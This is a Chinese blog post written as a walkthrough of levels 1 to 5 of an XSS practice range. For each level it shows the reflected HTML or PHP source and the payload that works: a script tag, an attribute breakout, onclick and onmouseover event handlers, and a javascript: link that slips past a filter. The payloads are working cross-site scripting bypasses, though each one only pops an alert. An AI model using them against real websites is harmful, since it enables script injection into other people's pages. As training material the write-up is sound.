---
layout: post
title: "XSS_Game-level-1-5" 
subtitle: "XSS_Game-level-1-5"
date: 2019-06-25
author: ppbibo
category: Notes
---



[TOC]

## Level-1 无过滤

```bash
http://xss.tesla-space.com/level1.php?name=<script>alert(1)</script>
```

![xss-level-1](/static/img/xss-level-1.png)

没有任何效验直接弹窗。



## Level-2 无过滤

继续尝试上一关的**payload**进行测试，源代码回显如下：

```html
<body>
<h1 align=center>欢迎来到level2</h1>
<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>
<form action=level2.php method=GET>
<input name=keyword  value="<script>alert(1)</script>">
<input type=submit name=submit value="搜索"/>
</form>
</center><center><img src=level2.png></center>
<h3 align=center>payload的长度:25</h3><h2 align=center>By:HACK学习</h2>
</body>
```

出现了两处第一处被转义如下：

```<``` 被转义成 ```&lt;```

```>``` 被转义成 ```&gt; ```



第二处  ```input ``` 标签没有任何效验 , 闭合value标签编写 **payload ** ```"><script>alert(1)</script>``` 成功弹窗。

![xss-level-2-1](/static/img/xss-level-2.png)



## Level-3 利用 HTML 事件属性

先尝试上一关的 **payload** 源代码回显如下：

```html
<h2 align=center>没有找到和&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'>
<input type=submit name=submit value=搜索 />
</form>
```

发现两处都被转义了如下：

```"``` 被转义成 ```&quot;```

利用 ```onclick``` 点击事件来完成弹窗 ,  **payload **```' onclick=alert(1)<'```

![xss-level-3](/static/img/xss-level-3.png)



## Level-4 利用 HTML 事件属性

尝试上一关的 **payload** 插入，源代码回显如下：

```html
<h2 align=center>没有找到和' onclick=alert(1)&lt;'相关的结果.</h2><center>
<form action=level4.php method=GET>
<input name=keyword  value="' onclick=alert(1)'">
<input type=submit name=submit value=搜索 />
</form>
```

发现单引号改为了双引号，利用 **payload ** ``` "onmouseover="alert(111)```  成功弹窗。

![xss-level-4](/static/img/xss-level-4.png)

*Tag：*```当指针移动到标签 onmouseover 上就会触发 ``` 。



## Level-5 链接触发

看了下php源码代码如下：

```php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
```

发现将```get```的参数都转换成了小写，防止了大小写绕过，将所有的```<script``` 替换成了``` <scr_ipt ```并且将 ```on ```替换成了``` o_n``` ，利用一种链接的形式来调用 JS （而且 html 语言并不是那么严格）**payload** ```"><a href="javascript:alert(1)">点我有惊喜～```  成功弹窗。

![xss-level-5](/static/img/xss-level-5.png)



## Level-6 

持续更新...

[靶场地址](http://xss.tesla-space.com)
[参考1](https://comydream.github.io/2019/05/18/xss-20-game/)
[参考2](https://mp.weixin.qq.com/s/4m1p1NyOhT0nlStyeYsXlw)